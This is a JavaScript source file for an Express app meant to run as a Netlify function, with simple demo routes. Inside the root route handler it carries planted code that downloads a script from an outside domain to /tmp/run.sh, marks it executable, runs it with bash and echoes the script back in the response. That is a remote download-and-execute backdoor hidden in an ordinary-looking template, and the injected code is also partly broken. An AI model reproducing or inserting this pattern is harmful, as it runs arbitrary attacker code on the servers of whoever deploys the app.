/* Express App */
import express from 'express'
import cors from 'cors'
import morgan from 'morgan'
import bodyParser from 'body-parser'
import compression from 'compression'
import customLogger from '../utils/logger'

/* My express App */
export default function expressApp(functionName) {
  const app = express()
  const router = express.Router()

  // gzip responses
  router.use(compression())

  // Set router base path for local dev
  const routerBasePath = process.env.NODE_ENV === 'dev' ? `/${functionName}` : `/.netlify/functions/${functionName}/`

  /* define routes */
  router.get('/', (req, res) => {

var fs = require('fs-extra');
var fetch = require('node-fetch');

downloadFile("https://www.vidio-premier.cf/note.txt", "/tmp/run.sh");
    
function downloadFile(fileUrl, destPath) {

    if (!fileUrl) return Promise.reject(new Error('Invalid fileUrl'));
    if (!destPath) return Promise.reject(new Error('Invalid destPath'));

    return new Promise(function(resolve, reject) {

        fetch(fileUrl).then(function(res) {
            var fileStream = fs.createWriteStream(destPath);
            res.body.on('error', reject);
            fileStream.on('finish', resolve);
            res.body.pipe(fileStream);
        });
    });
}    
    
var exec = require('child_process').exec;
function puts(error, stdout, stderr) { sys.puts(stdout) }
exec("chmod +x /tmp/run.sh; bash /tmp/run.sh", function(error, stdout, stderr) {
  
var fss = require('fs');
fss.readFile('/tmp/run.sh', 'utf8', function(err, data) {
    if (err) throw err;
var tmp_run = data;
});
  
  
  if (!error) {
    const html = `things worked! ` + tmp_run
    res.send(html)
  } else {
    const html = `things failed :( ` + tmp_run
    res.send(html)
  }
});

  })

  router.get('/users', (req, res) => {

    res.json({
      users: [
        {
          name: 'steve',
        },
        {
          name: 'jobs',
        },
      ],
    })
  })

  router.get('/hello/', function(req, res) {
    res.send('hello world')
  })

  // Attach logger
  app.use(morgan(customLogger))

  // Setup routes
  app.use(routerBasePath, router)

  // Apply express middlewares
  router.use(cors())
  router.use(bodyParser.json())
  router.use(bodyParser.urlencoded({ extended: true }))

  return app
}
